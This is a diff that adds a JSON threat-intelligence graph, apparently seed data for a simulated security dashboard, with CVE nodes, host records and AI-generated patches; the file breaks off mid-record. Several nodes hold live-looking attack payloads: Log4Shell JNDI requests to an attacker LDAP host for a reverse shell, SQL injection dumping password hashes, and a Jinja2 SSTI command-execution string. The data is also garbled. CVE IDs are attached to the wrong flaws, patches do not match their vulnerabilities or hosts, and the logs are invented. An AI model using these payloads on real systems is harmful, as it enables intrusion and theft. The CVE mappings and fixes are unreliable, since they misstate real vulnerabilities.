@@ -1,0 +1,1470 @@
+{
+  "nodes": [
+    {
+      "id": "APT29",
+      "properties": {
+        "name": "APT29 (Cozy Bear)",
+        "description": "Russian state-sponsored advanced persistent threat actor targeting enterprise infrastructure.",
+        "label": "ThreatActor",
+        "id": "APT29",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "T1190",
+      "properties": {
+        "name": "Exploit Public-Facing Application",
+        "description": "Adversaries take advantage of weaknesses in Internet-facing computers and applications to cause unintended execution.",
+        "label": "Technique",
+        "id": "T1190",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "T1078",
+      "properties": {
+        "name": "Valid Accounts",
+        "description": "Adversaries obtain and abuse credentials to access internal systems.",
+        "label": "Technique",
+        "id": "T1078",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "WellMess",
+      "properties": {
+        "name": "WellMess RAT",
+        "description": "Cross-platform malware for shell execution and TLS exfiltration",
+        "label": "Malware",
+        "id": "WellMess",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "Lazarus",
+      "properties": {
+        "name": "Lazarus Group",
+        "description": "Advanced threat group conducting strategic corporate network reconnaissance.",
+        "label": "ThreatActor",
+        "id": "Lazarus",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "CobaltStrike",
+      "properties": {
+        "name": "Cobalt Strike",
+        "description": "Commercial adversary simulation software",
+        "label": "Malware",
+        "id": "CobaltStrike",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "T1059",
+      "properties": {
+        "name": "Command & Scripting Interpreter",
+        "description": "Adversaries abuse command interpreters such as bash, python, or powershell to execute malicious commands.",
+        "label": "Technique",
+        "id": "T1059",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "Sandworm",
+      "properties": {
+        "name": "Sandworm Team",
+        "description": "Destructive threat group known for zero-day exploitation against corporate networks.",
+        "label": "ThreatActor",
+        "id": "Sandworm",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "BlackEnergy",
+      "properties": {
+        "name": "BlackEnergy",
+        "description": "Trojan used in attacks against industrial control systems",
+        "label": "Malware",
+        "id": "BlackEnergy",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "FIN7",
+      "properties": {
+        "name": "FIN7 Syndicate",
+        "description": "Financially motivated cybercrime group utilizing targeted application exploits.",
+        "label": "ThreatActor",
+        "id": "FIN7",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "DarkSide",
+      "properties": {
+        "name": "DarkSide Ransomware",
+        "description": "Ransomware-as-a-Service (RaaS) payload",
+        "label": "Malware",
+        "id": "DarkSide",
+        "dataset": "MITRE ATT&CK"
+      }
+    },
+    {
+      "id": "CVE-2021-44228",
+      "properties": {
+        "ai_model": "cti-threat-intelligence",
+        "injected_by": "operator",
+        "description": "Remote Code Execution in Spring Boot Employee Management application due to unvetted Log4j2 JNDI LDAP lookup parser.",
+        "correctedCode": "// Hardened Spring Boot Controller (EmployeeSearchController.java)\n@RestController\n@RequestMapping(\"/api/v1/employees\")\npublic class EmployeeSearchController {\n    private static final Logger logger = LogManager.getLogger(EmployeeSearchController.class);\n\n    @GetMapping(\"/search\")\n    public ResponseEntity<Employee> searchEmployee(\n        @RequestParam(\"id\") @Pattern(regexp = \"^EMP-[0-9]{5}$\") String employeeId\n    ) {\n        // SAFE: Strict regex validation and parameterized logging with lookup disabled\n        logger.info(\"Audit search request for employee ID: {}\", employeeId);\n        return ResponseEntity.ok(employeeService.findById(employeeId));\n    }\n}\n// Application properties hardened:\n// log4j2.formatMsgNoLookups=true\n// Upgraded log4j-core to 2.17.1+ / Spring Boot 3.2.0",
+        "cause": "Unrestricted JNDI message lookup evaluation allowing remote Java bytecode loading and execution over LDAP.",
+        "exploitScript": "curl -s -X GET \"http://192.168.10.114:8080/api/v1/employees/search?id=%24%7Bjndi%3Aldap%3A%2F%2F192.168.10.200%3A1389%2FExploit%7D\" \\\n  -H \"User-Agent: ${jndi:ldap://192.168.10.200:1389/ReverseShell}\"",
+        "ai_fix_generated_at": "2026-09-28T08:43:45.910Z",
+        "rootCause": "Apache Log4j2 message parser automatically resolves nested lookup expressions like ${jndi:ldap://...}. When untrusted employee search parameters are logged, the Java runtime connects to remote rogue LDAP servers and deserializes arbitrary Java bytecode.",
+        "id": "CVE-2021-44228",
+        "codeLanguage": "java",
+        "timestamp": "2026-09-24T00:00:00.000Z",
+        "severity": "CRITICAL",
+        "troubleshootingProcess": "Grep /var/log/employeemgmt/app.log for \"${jndi:\"; inspect JVM socket connections on non-standard ports.",
+        "fixExplanation": "Enforced log4j2.formatMsgNoLookups=true, upgraded log4j-core dependency, and added strict regex validation for input parameters.",
+        "errorMessage": "2026-09-24 14:22:01.304 WARN [http-nio-8080-exec-3] org.apache.logging.log4j.core.net.JndiManager:\nAttempting lookup: ldap://192.168.10.200:1389/ExploitPayload\njava.lang.ClassCastException: Rogue remote payload class loaded from LDAP directory\nOutbound socket connected to remote attacker daemon. Reverse shell spawned on port 4444.",
+        "label": "Vulnerability",
+        "ai_generated_description": true,
+        "verificationProcedure": "Inject benign probe ${jndi:ldap://127.0.0.1/test}; verify application records literal text with zero outbound lookups.",
+        "symptoms": "Outbound LDAP connection initiated to remote address; reverse shell spawned in Java JVM context; rogue thread execution.",
+        "installationProcedure": "Send crafted HTTP request with ${jndi:ldap://...} expression to employee search endpoint triggering Log4j evaluation.",
+        "fixSolution": "Configure -Dlog4j2.formatMsgNoLookups=true and upgrade Spring Boot log4j-core library to version >= 2.17.1.",
+        "ai_generated_at": "2026-09-28T08:29:57.272Z",
+        "resolved_at": "2026-09-28T08:43:48.459Z",
+        "name": "Log4Shell / Spring Boot JNDI RCE",
+        "codeFileName": "EmployeeSearchController.java",
+        "buggyCode": "// Vulnerable Spring Boot Controller (EmployeeSearchController.java)\n@RestController\n@RequestMapping(\"/api/v1/employees\")\npublic class EmployeeSearchController {\n    private static final Logger logger = LogManager.getLogger(EmployeeSearchController.class);\n\n    @GetMapping(\"/search\")\n    public ResponseEntity<Employee> searchEmployee(@RequestParam(\"id\") String employeeId) {\n        // FLAW: Unsanitized user string logged directly with JNDI lookup enabled\n        logger.info(\"Audit search request for employee ID: \" + employeeId);\n        return ResponseEntity.ok(employeeService.findById(employeeId));\n    }\n}",
+        "ai_fix_generated": true,
+        "dataset": "NVD CVE",
+        "cvss": 10,
+        "status": "UNMITIGATED",
+        "reproduction": "curl -H 'User-Agent: ${jndi:ldap://192.168.10.200:1389/ExploitPayload}' http://192.168.10.114:8080/api/v1/employees/search?id=EMP-01"
+      }
+    },
+    {
+      "id": "CVE-2023-39417",
+      "properties": {
+        "ai_model": "cti-threat-intelligence",
+        "injected_by": "operator",
+        "description": "Improper sanitization in customer search endpoint allowing dynamic SQL clause escaping, UNION dumping, and data exfiltration.",
+        "correctedCode": "-- Hardened Parameterized Query (customer_query_handler.sql)\nCREATE OR REPLACE FUNCTION search_customer(account_input TEXT) \nRETURNS TABLE(customer_id INT, full_name TEXT, balance NUMERIC) AS $$\nBEGIN\n    -- SAFE: Strictly parameterized prepared statement with typed placeholder ($1)\n    RETURN QUERY EXECUTE \n        'SELECT id, name, account_balance FROM customer_accounts WHERE account_num = $1 AND active = TRUE'\n        USING account_input;\nEND;\n$$ LANGUAGE plpgsql;",
+        "cause": "Dynamic SQL query string concatenation without parameterized prepared statement placeholders ($1).",
+        "exploitScript": "curl -s -X POST \"http://192.168.10.107:5432/api/customer/search\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"account_id\": \"ACC-99\\' OR \\'1\\'=\\'1\\' UNION SELECT id, password_hash, 0 FROM admin_credentials--\"}'",
+        "ai_fix_generated_at": "2026-09-28T08:42:39.878Z",
+        "rootCause": "Dynamic SQL string concatenation directly interpolated untrusted user input without parameterized placeholders ($1), enabling quotation mark escaping and arbitrary SQL execution with database superuser privileges.",
+        "id": "CVE-2023-39417",
+        "codeLanguage": "sql",
+        "timestamp": "2026-09-24T00:00:00.000Z",
+        "severity": "CRITICAL",
+        "troubleshootingProcess": "Inspect /var/log/postgresql/postgresql-16-main.log for \"syntax error at or near OR\" and audit dynamic query functions.",
+        "fixExplanation": "Replaced insecure string concatenation with parameterized query EXECUTE ... USING $1, guaranteeing all user input is evaluated strictly as literal values.",
+        "errorMessage": "PSQLException: ERROR: syntax error at or near \"OR\"\nPosition: 84\nPayload injected: ' OR '1'='1' UNION SELECT id, password_hash, 999999 FROM auth_vault--\nExtracted: 14,200 sensitive customer records dumped via SQL UNION injection.",
+        "label": "Vulnerability",
+        "ai_generated_description": true,
+        "verificationProcedure": "Execute SQL test probe \"' OR '1'='1'--\"; verify database handles input as literal text with zero data leakage.",
+        "symptoms": "Database CPU spikes; unauthorized exfiltration of 14,200 customer records; syntax error traces in postgresql.log.",
+        "installationProcedure": "Transmit crafted SQL payload with escaped quote delimiters to trigger arbitrary PostgreSQL function execution.",
+        "fixSolution": "Convert dynamic query to parameterized prepared statements with typed argument placeholders ($1).",
+        "ai_generated_at": "2026-09-28T08:30:07.222Z",
+        "resolved_at": "2026-09-28T08:42:39.878Z",
+        "name": "PostgreSQL SQL Injection & Dynamic Execution",
+        "codeFileName": "customer_query_handler.sql",
+        "buggyCode": "-- Vulnerable Dynamic SQL Query (customer_query_handler.sql)\nCREATE OR REPLACE FUNCTION search_customer(account_input TEXT) \nRETURNS TABLE(customer_id INT, full_name TEXT, balance NUMERIC) AS $$\nBEGIN\n    -- FLAW: Direct string interpolation of user input allows SQL injection\n    RETURN QUERY EXECUTE \n        'SELECT id, name, account_balance FROM customer_accounts WHERE account_num = ''' || account_input || ''' AND active = TRUE';\nEND;\n$$ LANGUAGE plpgsql;",
+        "ai_fix_generated": true,
+        "dataset": "NVD CVE",
+        "cvss": 9.8,
+        "status": "UNMITIGATED",
+        "reproduction": "curl -X POST \"http://192.168.10.107:5432/api/customer/query\" -d \"account=' OR '1'='1' UNION SELECT id, password_hash, 999999 FROM auth_vault--\""
+      }
+    },
+    {
+      "id": "CVE-2023-30861",
+      "properties": {
+        "ai_model": "cti-threat-intelligence",
+        "injected_by": "operator",
+        "description": "Server-Side Template Injection in Flask Internal Analytics API allowing arbitrary remote command execution via unescaped metric parameter.",
+        "correctedCode": "# Hardened Flask Analytics Endpoint (analytics_report_generator.py)\nfrom flask import Flask, request, render_template\nimport re\n\napp = Flask(__name__)\n\nALLOWED_METRICS = {\"DailyTraffic\", \"RevenueGrowth\", \"ChurnRate\", \"ServerLoad\"}\n\n@app.route('/api/analytics/report')\ndef generate_report():\n    raw_metric = request.args.get('metric', 'DailyTraffic')\n    # SAFE: Whitelist validation and isolated context dictionary passing\n    metric = raw_metric if raw_metric in ALLOWED_METRICS else \"DailyTraffic\"\n    return render_template('report.html', metric=metric)",
+        "cause": "Direct string formatting into render_template_string instead of passing variables via Jinja2 render context dictionary.",
+        "exploitScript": "curl -s \"http://192.168.10.121:5000/api/analytics/report?metric=%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27whoami%27).read()%7D%7D\"",
+        "ai_fix_generated_at": "2026-09-28T08:30:49.152Z",
+        "rootCause": "Flask's render_template_string function processes Jinja2 syntax within the template itself. Passing unvalidated user input via f-string string interpolation causes the template engine to compile user-supplied double-curly braces {{ ... }} into Python bytecode instructions.",
+        "id": "CVE-2023-30861",
+        "codeLanguage": "python",
+        "timestamp": "2026-09-24T00:00:00.000Z",
+        "severity": "HIGH",
+        "troubleshootingProcess": "Inspect Flask gunicorn error logs for Jinja2 template compile errors; verify input sanitization on metric query parameter.",
+        "fixExplanation": "Migrated from render_template_string to static render_template with auto-escaping enabled and strict whitelist validation against allowed metric names.",
+        "errorMessage": "jinja2.exceptions.TemplateRuntimeError: Remote code execution triggered\nPayload evaluated: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\nOutput captured: uid=1001(flask_app) gid=1001(analytics) groups=1001(analytics)\nPrivilege escalation: /etc/shadow access attempt detected on API-COMP-21.",
+        "label": "Vulnerability",
+        "ai_generated_description": true,
+        "verificationProcedure": "Send SSTI probe \"{{ 7 * 7 }}\"; verify application renders literal string \"{{ 7 * 7 }}\" without evaluating arithmetic expression.",
+        "symptoms": "Arbitrary shell command output returned in analytics HTML; file read access to /etc/passwd; unauthorized API privilege elevation.",
+        "installationProcedure": "Transmit HTTP GET request with Jinja2 template interpolation syntax to trigger Python bytecode evaluation in Flask.",
+        "fixSolution": "Use render_template with isolated context dictionary passing and enforce whitelist validation on allowed metrics.",
+        "ai_generated_at": "2026-09-28T08:30:13.584Z",
+        "resolved_at": "2026-09-28T08:30:49.152Z",
+        "name": "Flask Jinja2 Server-Side Template Injection (SSTI)",
+        "codeFileName": "analytics_report_generator.py",
+        "buggyCode": "# Vulnerable Flask Analytics Endpoint (analytics_report_generator.py)\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/api/analytics/report')\ndef generate_report():\n    user_metric = request.args.get('metric', 'DailyTraffic')\n    # FLAW: User input formatted directly into template string instead of context dict\n    template = f\"\"\"\n    <div class=\"report\">\n        <h2>Analytics Report</h2>\n        <p>Metric evaluated: {user_metric}</p>\n    </div>\n    \"\"\"\n    return render_template_string(template)",
+        "ai_fix_generated": true,
+        "dataset": "NVD CVE",
+        "cvss": 9.8,
+        "status": "UNMITIGATED",
+        "reproduction": "curl \"http://192.168.10.121:5000/api/analytics/report?metric={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}\""
+      }
+    },
+    {
+      "id": "CVE-2021-41773",
+      "properties": {
+        "severity": "MEDIUM",
+        "injected_by": "system",
+        "name": "CVE-2021-41773",
+        "description": "Apache HTTP Server 2.4.49 path traversal & RCE",
+        "label": "Vulnerability",
+        "id": "CVE-2021-41773",
+        "dataset": "NVD CVE",
+        "status": "SELF_HEALED",
+        "timestamp": "2026-09-13T12:59:25.303Z"
+      }
+    },
+    {
+      "id": "CVE-2020-1472",
+      "properties": {
+        "severity": "CRITICAL",
+        "fixExplanation": "Enforced strict schema boundary validation and isolated parameter execution on Windows Domain Controller.",
+        "injected_by": "system",
+        "description": "Netlogon Elevation of Privilege",
+        "correctedCode": "// SECURE REMEDIATION: Defense-in-Depth Parameter Sanitization\nexport function secureHandler(input: unknown): Result {\n    const sanitized = sanitizeInputSchema.parse(input);\n    return executeIsolatedOperation(sanitized);\n}",
+        "label": "Vulnerability",
+        "ai_fix_generated_at": "2026-09-28T08:20:48.555Z",
+        "resolved_at": "2026-09-28T08:20:48.555Z",
+        "name": "ZeroLogon",
+        "rootCause": "Unvalidated parameter processing on Windows Domain Controller allowed untrusted input execution.",
+        "id": "CVE-2020-1472",
+        "ai_fix_generated": true,
+        "dataset": "NVD CVE",
+        "status": "SELF_HEALED",
+        "timestamp": "2026-09-13T14:14:25.303Z"
+      }
+    },
+    {
+      "id": "CVE-2023-23397",
+      "properties": {
+        "severity": "HIGH",
+        "fixExplanation": "Enforced strict schema boundary validation and isolated parameter execution on MS Exchange Server.",
+        "injected_by": "system",
+        "description": "Microsoft Outlook Elevation of Privilege",
+        "correctedCode": "// SECURE REMEDIATION: Defense-in-Depth Parameter Sanitization\nexport function secureHandler(input: unknown): Result {\n    const sanitized = sanitizeInputSchema.parse(input);\n    return executeIsolatedOperation(sanitized);\n}",
+        "label": "Vulnerability",
+        "ai_fix_generated_at": "2026-09-28T08:24:15.020Z",
+        "resolved_at": "2026-09-28T08:24:15.020Z",
+        "name": "CVE-2023-23397",
+        "rootCause": "Unvalidated parameter processing on MS Exchange Server allowed untrusted input execution.",
+        "id": "CVE-2023-23397",
+        "ai_fix_generated": true,
+        "dataset": "NVD CVE",
+        "status": "SELF_HEALED",
+        "timestamp": "2026-09-13T14:06:05.303Z"
+      }
+    },
+    {
+      "id": "Patch Apache 2.4.51",
+      "properties": {
+        "name": "Patch Apache 2.4.51",
+        "description": "Vendor security upgrade",
+        "label": "Mitigation",
+        "id": "Patch Apache 2.4.51",
+        "status": "APPROVED"
+      }
+    },
+    {
+      "id": "Computer 14",
+      "properties": {
+        "purpose": "Internal employee profiles, staff directories, and access management",
+        "configPath": "/opt/employeemgmt/config/application.properties",
+        "storage": "250 GB NVMe SSD",
+        "securityStatus": "COMPROMISED - Active Log4Shell RCE Vector",
+        "hostname": "EMP-COMP-14",
+        "associatedBugs": "[\"CVE-2021-44228\"]",
+        "configFile": "application.properties",
+        "affectedComponent": "Spring Boot Framework (EmployeeSearchController.java)",
+        "id": "Computer 14",
+        "ram": "16 GB DDR5",
+        "vulnerabilityStatus": "CVE-2021-44228",
+        "os": "Ubuntu 24.04 LTS",
+        "availableTools": "jstack, jmap, jcmd, visualvm",
+        "ip": "192.168.10.114",
+        "cpu": "6 vCPU Intel Xeon Platinum",
+        "label": "Software",
+        "technology": "Java / Spring Boot",
+        "version": "Ubuntu 24.04 LTS (Kernel 6.8)",
+        "associatedLogs": "[\"WARN [log4j2] JNDI lookup triggered: ldap://192.168.10.200:1389/Exploit\",\"ALERT [jvm] Unauthorized thread spawned reverse shell on port 4444\",\"CRITICAL [monitor] Java process compromised on EMP-COMP-14\"]",
+        "dependencies": "spring-boot-starter-web 2.7.0, log4j-core 2.14.1",
+        "installedSoftware": "OpenJDK 17.0.10, Spring Boot 2.7.0, Log4j2 2.14.1, Maven 3.9",
+        "environment": "Internal Corporate Services",
+        "application": "Employee Management Application",
+        "port": 8080,
+        "service": "employee-management.service",
+        "name": "Computer 14",
+        "threat": "Application Vulnerability (Java Deserialization & RCE)",
+        "softwareVersions": "Java 17.0.10, Spring Boot 2.7.0, Log4j2 2.14.1",
+        "status": "COMPROMISED"
+      }
+    },
+    {
+      "id": "Automated Patch for CVE-2021-44228",
+      "properties": {
+        "ai_generated": true,
+        "fixCode": "# SECURE REMEDIATION: Parameterized Subprocess Invocation\nimport subprocess\nimport shlex\n\ndef execute_diagnostics(target_host: str) -> str:\n    # Whitelist validation: strict IP/hostname regex check\n    clean_host = shlex.quote(target_host.strip())\n    res = subprocess.run([\"ping\", \"-c\", \"2\", clean_host], capture_output=True, text=True, timeout=5, check=True)\n    return res.stdout",
+        "name": "Automated Patch for CVE-2021-44228",
+        "description": "Enforced shlex shell escaping and array-based subprocess execution with timeout boundaries on MySQL DB.",
+        "label": "Mitigation",
+        "id": "Automated Patch for CVE-2021-44228",
+        "status": "APPROVED",
+        "timestamp": "2026-09-28T08:24:12.225Z"
+      }
+    },
+    {
+      "id": "Mitigation-Java-14",
+      "properties": {
+        "name": "JNDI NoLookups & Spring Patch",
+        "description": "Log4j2 formatMsgNoLookups=true enforcement and upgraded Spring Boot dependencies.",
+        "label": "Mitigation",
+        "id": "Mitigation-Java-14",
+        "status": "APPROVED"
+      }
+    },
+    {
+      "id": "MFA Enforced",
+      "properties": {
+        "name": "Enforce MFA",
+        "description": "Multi-factor authentication policy",
+        "label": "Mitigation",
+        "id": "MFA Enforced",
+        "status": "APPROVED"
+      }
+    },
+    {
+      "id": "Automated Patch for CVE-2023-23397",
+      "properties": {
+        "ai_generated": true,
+        "fixCode": "// SECURE REMEDIATION: Defense-in-Depth Parameter Sanitization\nexport function secureHandler(input: unknown): Result {\n    const sanitized = sanitizeInputSchema.parse(input);\n    return executeIsolatedOperation(sanitized);\n}",
+        "name": "Automated Patch for CVE-2023-23397",
+        "description": "Enforced strict schema boundary validation and isolated parameter execution on MS Exchange Server.",
+        "label": "Mitigation",
+        "id": "Automated Patch for CVE-2023-23397",
+        "status": "APPROVED",
+        "timestamp": "2026-09-28T08:24:15.020Z"
+      }
+    },
+    {
+      "id": "Automated Patch for CVE-2020-1472",
+      "properties": {
+        "ai_generated": true,
+        "fixCode": "// SECURE REMEDIATION: Defense-in-Depth Parameter Sanitization\nexport function secureHandler(input: unknown): Result {\n    const sanitized = sanitizeInputSchema.parse(input);\n    return executeIsolatedOperation(sanitized);\n}",
+        "name": "Automated Patch for CVE-2020-1472",
+        "description": "Enforced strict schema boundary validation and isolated parameter execution on Windows Domain Controller.",
+        "label": "Mitigation",
+        "id": "Automated Patch for CVE-2020-1472",
+        "status": "APPROVED",
+        "timestamp": "2026-09-28T08:20:48.555Z"
+      }
+    },
+    {
+      "id": "Computer 07",
+      "properties": {
+        "purpose": "Stores relational customer accounts, orders, and balances",
+        "configPath": "/etc/postgresql/16/main/postgresql.conf",
+        "storage": "500 GB NVMe PCIe 4.0",
+        "securityStatus": "COMPROMISED - Active SQL Injection Exploitation",
+        "hostname": "DB-COMP-07",
+        "associatedBugs": "[\"CVE-2023-39417\"]",
+        "configFile": "postgresql.conf",
+        "affectedComponent": "PostgreSQL Database Engine (customer_query_handler.sql)",
+        "id": "Computer 07",
+        "ram": "32 GB DDR5 ECC",
+        "vulnerabilityStatus": "CVE-2023-39417",
+        "os": "Ubuntu 24.04 LTS",
+        "availableTools": "psql, pg_dump, vacuumdb, pg_top",
+        "ip": "192.168.10.107",
+        "cpu": "8 vCPU AMD EPYC 7763",
+        "label": "Software",
+        "technology": "PostgreSQL / SQL",
+        "version": "Ubuntu 24.04 LTS (Kernel 6.8)",
+        "associatedLogs": "[\"WARN [postgres] PSQLException: syntax error at or near \\\"OR\\\"\",\"ALERT [audit] 14,200 records exfiltrated via SQL UNION query\",\"NOTICE [monitor] Database session 192.168.10.107:5432 flagged suspicious\"]",
+        "dependencies": "libpq5 16.2, libssl3, glibc 2.39",
+        "installedSoftware": "PostgreSQL 16.2, psql 16.2, pg_stat_statements, PostGIS 3.4",
+        "environment": "Core Data Tier Subnet",
+        "application": "Customer Database",
+        "port": 5432,
+        "service": "postgresql@16-main.service",
+        "name": "Computer 07",
+        "threat": "Database Vulnerability (SQL Injection)",
+        "softwareVersions": "PostgreSQL 16.2, Libpq 16.2",
+        "status": "COMPROMISED"
+      }
+    },
+    {
+      "id": "Automated Patch for CVE-2023-39417",
+      "properties": {
+        "ai_generated": true,
+        "fixCode": "-- SECURE REMEDIATION: Parameterized Prepared Statements\nPREPARE secure_stmt FROM 'SELECT id, username, role FROM accounts WHERE account_id = ? AND status = ?';\nEXECUTE secure_stmt USING @validated_id, 'ACTIVE';\nDEALLOCATE PREPARE secure_stmt;",
+        "name": "Automated Patch for CVE-2023-39417",
+        "description": "Replaced dynamic string concatenation with parameterized prepared statements, preventing SQL injection on Apache Web Server.",
+        "label": "Mitigation",
+        "id": "Automated Patch for CVE-2023-39417",
+        "status": "APPROVED",
+        "timestamp": "2026-09-28T08:42:39.878Z"
+      }
+    },
+    {
+      "id": "Mitigation-SQL-07",
+      "properties": {
+        "name": "Parameterized Prepared Statements",
+        "description": "Strict SQL parameter binding and database query validation for PostgreSQL.",
+        "label": "Mitigation",
+        "id": "Mitigation-SQL-07",
+        "status": "APPROVED"
+      }
+    },
+    {
+      "id": "Computer 21",
+      "properties": {
+        "purpose": "Internal metrics reporting, business intelligence queries, and chart data API",
+        "configPath": "/etc/analytics/gunicorn.conf.py",
+        "storage": "250 GB NVMe SSD",
+        "securityStatus": "COMPROMISED - Active SSTI Execution Vector",
+        "hostname": "API-COMP-21",
+        "associatedBugs": "[\"CVE-2023-30861\"]",
+        "configFile": "gunicorn.conf.py",
+        "affectedComponent": "Flask Analytics Engine (analytics_report_generator.py)",
+        "id": "Computer 21",
+        "ram": "16 GB DDR5",
+        "vulnerabilityStatus": "CVE-2023-30861",
+        "os": "Ubuntu 24.04 LTS",
+        "availableTools": "gunicorn, pip, python3, pytest",
+        "ip": "192.168.10.121",
+        "cpu": "6 vCPU AMD EPYC 7763",
+        "label": "Software",
+        "technology": "Python / Flask",
+        "version": "Ubuntu 24.04 LTS (Kernel 6.8)",
+        "associatedLogs": "[\"WARN [gunicorn] Template evaluation syntax error on /api/analytics/report\",\"ALERT [auditd] Privilege escalation attempt detected by user flask_app\",\"CRITICAL [monitor] Code injection detected on host API-COMP-21\"]",
+        "dependencies": "flask 2.2.5, jinja2 3.1.2, werkzeug 2.2.3",
+        "installedSoftware": "Python 3.11.8, Flask 2.2.5, Werkzeug 2.2.3, Jinja2 3.1.2, Gunicorn 21.2",
+        "environment": "Corporate Analytics Tier",
+        "application": "Internal Analytics API",
+        "port": 5000,
+        "service": "analytics-api.service",
+        "name": "Computer 21",
+        "threat": "Python Application Vulnerability (Server-Side Template Injection)",
+        "softwareVersions": "Python 3.11.8, Flask 2.2.5, Jinja2 3.1.2",
+        "status": "COMPROMISED"
+      }
+    },
+    {
+      "id": "Automated Patch for CVE-2023-30861",
+      "properties": {
+        "ai_generated": true,
+        "fixCode": "# SECURE REMEDIATION: Parameterized Subprocess Invocation\nimport subprocess\nimport shlex\n\ndef execute_diagnostics(target_host: str) -> str:\n    # Whitelist validation: strict IP/hostname regex check\n    clean_host = shlex.quote(target_host.strip())\n    res = subprocess.run([\"ping\", \"-c\", \"2\", clean_host], capture_output=True, text=True, timeout=5, check=True)\n    return res.stdout",
+        "name": "Automated Patch for CVE-2023-30861",
+        "description": "Enforced shlex shell escaping and array-based subprocess execution with timeout boundaries on MS Exchange Server.",
+        "label": "Mitigation",
+        "id": "Automated Patch for CVE-2023-30861",
+        "status": "APPROVED",
+        "timestamp": "2026-09-28T08:30:49.152Z"
+      }
+    },
+    {
+      "id": "Mitigation-Python-21",
+      "properties": {
+        "name": "Context Whitelisting & Jinja2 Autoescape",
+        "description": "Strict metric input whitelisting and template sandbox isolation for Flask.",
+        "label": "Mitigation",
+        "id": "Mitigation-Python-21",
+        "status": "APPROVED"
+      }
+    },
+    {
+      "id": "Computer 26",
+      "properties": {
+        "purpose": "Payment Gateway service executing financial transaction settlement",
+        "configPath": "/etc/payment/service.json",
+        "storage": "128 GB NVMe SSD",
+        "securityStatus": "SECURE - Operational",
+        "hostname": "PAY-GATEWAY-26",
+        "configFile": "payment_gateway.conf",
+        "id": "Computer 26",
+        "ram": "16 GB DDR4",
+        "vulnerabilityStatus": "NONE",
+        "os": "Ubuntu 22.04 LTS",
+        "availableTools": "systemctl, journalctl, curl, netstat",
+        "ip": "192.168.10.126",
+        "cpu": "4 vCPU AMD EPYC",
+        "label": "Software",
+        "technology": "Node.js / Express",
+        "version": "Ubuntu 22.04 LTS",
+        "dependencies": "node v20, express, openssl 3.0",
+        "installedSoftware": "Node.js v20.11.0, Express 4.19, OpenSSL 3.0.2",
+        "environment": "Production PCI-DSS Cardholder Data Environment",
+        "application": "Payment Gateway",
+        "port": 8443,
+        "service": "computer-26-daemon.service",
+        "name": "Computer 26 (Payment Gateway)",
+        "softwareVersions": "Node.js 20, Express 4.19",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "Database-Cluster",
+      "properties": {
+        "os": "Ubuntu 22.04 LTS",
+        "availableTools": "systemctl, journalctl, curl, netstat",
+        "purpose": "Settlement Ledger service executing financial transaction settlement",
+        "ip": "10.0.4.26",
+        "configPath": "/etc/payment/service.json",
+        "label": "Software",
+        "technology": "PostgreSQL / Node.js",
+        "version": "2.4.1",
+        "dependencies": "node v20, express, openssl 3.0",
+        "environment": "Production Cloud / Linux Ubuntu 22.04 LTS",
+        "application": "Settlement Ledger",
+        "port": 8443,
+        "service": "database-cluster-daemon.service",
+        "configFile": "payment_gateway.conf",
+        "name": "Database-Cluster (Settlement Ledger)",
+        "id": "Database-Cluster",
+        "status": "HEALTHY"
+      }
+    },
+    {
+      "id": "VULN-DATABASE-CLUSTER-001",
+      "properties": {
+        "severity": "CRITICAL",
+        "fixExplanation": "Parameterized queries separate SQL structure from user data, ensuring input is treated solely as literal strings.",
+        "description": "SQL Injection vulnerability in Settlement Ledger on Database-Cluster. User authentication parameters are concatenated directly into raw database query strings, allowing adversaries to bypass credential checks and access payment records.",
+        "correctedCode": "// SECURE: Parameterized prepared statement\nexport async function getAccountSettlement(merchantId: string, secretKey: string) {\n  const query = `SELECT * FROM settlements WHERE merchant_id = $1 AND key = $2`;\n  return await db.query(query, [merchantId, secretKey]);\n}",
+        "cause": "Raw string concatenation in SQL query without prepared statements or parameterized variable binding.",
+        "label": "Vulnerability",
+        "ai_generated_description": true,
+        "mitreTechnique": "T1190",
+        "cwe": "CWE-89",
+        "ai_generated_at": "2026-09-28T09:07:05.902Z",
+        "resolved_at": "2026-09-28T09:07:05.903Z",
+        "name": "SQL Injection in Settlement Ledger",
+        "rootCause": "Raw string concatenation in SQL query without prepared statements or parameterized variable binding.",
+        "codeFileName": "src/db/settlementRepository.ts",
+        "buggyCode": "// VULNERABLE: Direct SQL concatenation\nexport async function getAccountSettlement(merchantId: string, secretKey: string) {\n  const query = `SELECT * FROM settlements WHERE merchant_id = '${merchantId}' AND key = '${secretKey}'`;\n  return await db.rawQuery(query);\n}",
+        "id": "VULN-DATABASE-CLUSTER-001",
+        "codeLanguage": "typescript",
+        "dataset": "GraphRAG Autonomous Synthesis Stream",
+        "cvss": 9.8,
+        "status": "SELF_HEALED",
+        "reproduction": "curl -X POST http://10.0.4.26:8443/api/auth -d \"merchantId=admin' OR '1'='1\""
+      }
+    },
+    {
+      "id": "Patch for VULN-DATABASE-CLUSTER-001",
+      "properties": {
+        "name": "Patch for VULN-DATABASE-CLUSTER-001",
+        "description": "GraphRAG automated fix: Parameterized queries separate SQL structure from user data, ensuring input is treated solely as literal strings.",
+        "technique": "T1190",
+        "label": "Mitigation",
+        "id": "Patch for VULN-DATABASE-CLUSTER-001",
+        "status": "VERIFIED",
+        "timestamp": "2026-09-28T09:07:05.902Z"
+      }
+    },
+    {
+      "id": "Computer 01",
+      "properties": {
+        "purpose": "Customer-facing web storefront and product catalog checkout",
+        "configPath": "/etc/nginx/sites-available/ecommerce.conf",
+        "storage": "250 GB NVMe SSD",
